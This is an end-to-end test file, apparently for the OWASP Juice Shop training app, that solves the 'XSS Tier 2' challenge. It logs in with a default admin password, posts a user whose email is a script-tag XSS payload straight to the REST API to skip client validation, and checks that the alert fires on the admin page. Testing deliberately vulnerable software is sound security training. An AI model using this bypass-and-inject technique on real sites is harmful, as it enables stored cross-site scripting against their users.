describe('/#/register', () => {
  const config = require('config')
  protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

  beforeEach(() => {
    browser.get('/#/register')
  })

  describe('challenge "xss2"', () => {
    it('should be possible to bypass validation by directly using Rest API', () => {
      const EC = protractor.ExpectedConditions

      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.post(\'/api/Users\', {email: \'<script>alert("XSS2")</script>\', password: \'xss\'});')

      browser.get('/#/administration')
      browser.wait(EC.alertIsPresent(), 5000, "'XSS2' alert is not present")
      browser.switchTo().alert().then(alert => {
        expect(alert.getText()).toEqual('XSS2')
        alert.accept()
      })
    })

    protractor.expect.challengeSolved({challenge: 'XSS Tier 2'})
  })
})
